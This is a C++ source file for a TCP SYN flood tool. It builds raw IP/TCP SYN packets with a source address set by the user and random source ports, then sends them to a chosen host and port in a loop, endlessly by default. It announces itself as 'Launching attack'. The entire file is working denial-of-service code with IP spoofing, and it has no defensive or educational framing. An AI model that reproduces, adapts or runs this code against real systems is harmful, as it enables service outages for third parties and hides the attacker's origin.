#include "tcp_synflood.hpp"

using namespace std;

char SRC_IP[IP_SIZE];
char DST_IP[IP_SIZE];
unsigned short DST_PORT = 80;

int main(int argc, char **argv)
{
    int opt;
    unsigned int sleep_time = 10;
    int packet_to_send = -1;

    memset(SRC_IP, 0, IP_SIZE);
    memset(DST_IP, 0, IP_SIZE);

    while ((opt = getopt(argc, argv, "s:d:p:t:n:")) != EOF)
    {
        switch(opt)
        {
            case 's': {
                strcpy(SRC_IP, optarg);
                break;
            }
            case 'd': {
                strcpy(DST_IP, optarg);
                break;
            }
            case 'p': {
                DST_PORT = atoi(optarg);
                break;
            }
            case 'n': {
                packet_to_send = atoi(optarg);
                break;
            }
            case 't': {
                sleep_time = atoi(optarg);
                break;
            }
            case '?': {
                printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -t <time to sleep in ms>\n");
            }
        }
    }

    if(strlen(SRC_IP) > 0 && strlen(DST_IP) > 0)
    {
        printf("Launching attack to %s:%d from %s every %d ms\n", DST_IP, DST_PORT, SRC_PORT, sleep_time);
        exploit(sleep_time, packet_to_send);
    }
    else
        printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -t <time to sleep in ms>\n");

    return EXIT_SUCCESS;
}

void exploit(unsigned int time_to_sleep, int packet_to_send)
{
    SOCKET socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (socket_fd == SOCKET_ERROR)
    {
        printf("Socket creation failed.\n");
        exit(-1);
    }
    else
    {
        char packet[PACKET_SIZE];
        IPHDR *ip_header = (IPHDR *)packet;
        TCPHDR *tcp_header = (TCPHDR *)(packet + sizeof(IPHDR));
        TCPOPT *tcp_opt = (TCPOPT *)(packet + sizeof(IPHDR) + sizeof(TCPHDR));
        SOCKADDR_IN sin;

        const int one = 1;
        if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0 &&
           setsockopt(socket_fd, IPPROTO_IP, IP_NODEFRAG, &one, sizeof(one)) < 0)
        {
            printf("Error while setting socket options.\n");
            exit(-2);
        }
        else
        {
            for(int i = packet_to_send; i > 0 || i == -1; i--)
            {
                memset(packet, 0, PACKET_SIZE);
                fill_ip_header(ip_header);
                fill_tcp_opt(tcp_opt);
                fill_tcp_header(tcp_header, tcp_opt);

                sin.sin_family = AF_INET;
                sin.sin_port = htons(DST_PORT);
                sin.sin_addr.s_addr = inet_addr(DST_IP);

                if (sendto(socket_fd, packet, ip_header->tot_len, 0, (SOCKADDR *) &sin, sizeof(sin)) < 0)
		        {
			        printf("Error while sending packet.\n");
                    exit(-3);
		        }
		        else
                    this_thread::sleep_for(chrono::milliseconds(time_to_sleep));
            }
        }
    }

    close(socket_fd);
}

void fill_ip_header(IPHDR *ip_header)
{
    unsigned short packet_id = get_rand();

    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(IPHDR) + sizeof(TCPHDR) + sizeof(TCPOPT);
    ip_header->id = htons(packet_id);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr(SRC_IP);
    ip_header->daddr = inet_addr(DST_IP);

    ip_header->check = checksum((unsigned short *)ip_header, ip_header->tot_len);
}

void fill_tcp_opt(TCPOPT* tcp_opt)
{
    tcp_opt->mms_knd = 2;
    tcp_opt->mms_len = 4;
    tcp_opt->mms_val = htons(1440);
    tcp_opt->nop_1 = 1;
    tcp_opt->ws_knd = 3;
    tcp_opt->ws_len = 3;
    tcp_opt->ws_val = 8;
    tcp_opt->nop_2 = 1;
    tcp_opt->nop_3 = 1;
    tcp_opt->sck_knd = 4;
    tcp_opt->sck_len = 2;
}

void fill_tcp_header(TCPHDR *tcp_header, TCPOPT* tcp_opt)
{
    tcp_header->source = htons(get_rand());
    tcp_header->dest = htons(DST_PORT);
    tcp_header->seq = 0;
    tcp_header->ack_seq = 0;
    tcp_header->doff = 8;
    tcp_header->fin = 0;
    tcp_header->syn = 1;
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;
    tcp_header->urg = 0;
    tcp_header->window = htons(29200);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;

    PSD_HEADER pseudo_header;
    pseudo_header.source_address = inet_addr(SRC_IP);
    pseudo_header.dest_address = inet_addr(DST_IP);
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(sizeof(TCPHDR) + sizeof(TCPOPT));

    int p_size = sizeof(PSD_HEADER) + sizeof(TCPHDR) + sizeof(TCPOPT);
    char *buffer = (char *)malloc(p_size);
    memcpy(buffer, (char *)&pseudo_header, sizeof(PSD_HEADER));
    memcpy(buffer + sizeof(PSD_HEADER), tcp_header, sizeof(TCPHDR));
    memcpy(buffer + sizeof(PSD_HEADER) + sizeof(TCPHDR), tcp_opt, sizeof(TCPOPT));

    tcp_header->check = checksum((unsigned short *)buffer, p_size);
    free(buffer);
    buffer = nullptr;
}

unsigned short checksum(unsigned short *buffer, int nb_bytes)
{
	unsigned long check_sum = 0;

	while(nb_bytes > 1)
    {
		check_sum += *buffer++;
		nb_bytes -= sizeof(unsigned short);
	}

	if(nb_bytes == 1)
    {
		check_sum += *(unsigned char *)buffer;
	}

	check_sum = (check_sum >> 16) + (check_sum & 0xffff);
	check_sum += (check_sum >> 16);
	
	return (unsigned short)(~check_sum);
}

unsigned short get_rand()
{
    unsigned short random_value = 0;
    size_t size = sizeof(random_value);
    ifstream urandom("/dev/urandom", ios::in | ios::binary);
    if(urandom)
    {
        urandom.read(reinterpret_cast<char*>(&random_value), size);
        urandom.close();
    }
    else
    {
        cerr << "Failed to open stream /dev/urandom" << endl;
        random_value = 35789;
    }

    return random_value;
}